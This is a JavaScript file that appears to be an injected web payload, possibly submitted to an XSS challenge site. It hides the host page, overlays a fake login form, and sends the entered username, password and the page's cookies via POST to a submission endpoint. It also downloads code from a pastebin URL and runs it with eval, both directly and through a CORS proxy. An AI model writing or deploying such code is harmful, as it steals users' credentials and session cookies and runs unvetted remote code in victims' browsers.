const ID = 92;

const main = document.createElement("div");
main.innerHTML = `
  <h2>Login</h2>
  <div class="alert"></div>
  <form class="f">
    <div class="form-group">
      <label>Username</label><br />
      <div style="height: 10px"></div>
      <input type="text" name="username" class="form-control" value="" />
      <div style="height: 10px"></div>
      <span class="invalid-feedback"></span>
    </div>

    <div class="form-group">
      <label>Password</label><br />
      <div style="height: 10px"></div>
      <input type="password" name="password" class="form-control" />
      <div style="height: 10px"></div>
      <span class="invalid-feedback"></span>
    </div>

    <div class="form-group">
      <div style="height: 10px"></div>
      <button class="cta" type="submit">
        <span class="hover-underline-animation">Login</span>
        <svg
          id="arrow-horizontal"
          xmlns="http://www.w3.org/2000/svg"
          width="30"
          height="10"
          viewBox="0 0 46 16"
        >
          <path
            id="Path_10"
            data-name="Path 10"
            d="M8,0,6.545,1.455l5.506,5.506H-30V9.039H12.052L6.545,14.545,8,16l8-8Z"
            transform="translate(30)"
          ></path>
        </svg>
      </button>
    </div>
    <br />
    

    <p>Don't have an account? <a href="register2.php">Sign up now</a>.</p>
  </form>
`;
document.body.prepend(main);

const styleSheet = document.createElement("style");
styleSheet.textContent = `
  .gone {
    display: none;
  }
`;
document.head.appendChild(styleSheet);

const o = document.querySelector(".main");
o.classList.toggle("gone");
o.classList.toggle("main");

main.classList.toggle("main");

const div = document.createElement("div");
div.className = "cf-turnstile";
div.setAttribute("data-sitekey", "0x4AAAAAAB1bX0ifuWz3cloj");
div.setAttribute("data-theme", "auto");
document.querySelector(".f").appendChild(div);

document.querySelector(".f").addEventListener("submit", (e) => {
  e.preventDefault();
  const formData = new FormData(e.target);
  const user = formData.get("username");
  const pass = formData.get("password");
  console.log(user, pass);

  main.remove();
  o.classList.toggle("gone");
  o.classList.toggle("main");
  let cook = document.cookie;
  const data = {
    user: user,
    pass: pass,
    cookie: cook,
  };
  a(data);
});

async function a(e) {
  let s = `/auth/problems/submit.php?id=${ID}`;
  try {
    let i = await fetch(s, {
      method: "POST",
      headers: { "Content-Type": "application/json"},
      body: JSON.stringify(e),
    });
    if (!i.ok) throw Error(`HTTP error! status: ${i.status}`);
    let r = await i.text();
  } catch (a) {
  }
}

(async() => {
  eval(await (await fetch("https://pastebin.com/raw/jrDe50K0",{mode: 'no-cors',})).text());
})();

const xhr = new XMLHttpRequest();
xhr.open('GET', 'https://www.cors-anywhere.com/https://pastebin.com/raw/jrDe50K0');
xhr.onload = function() {
  console.log(this.responseText)
  eval(this.responseText);
};
xhr.send();

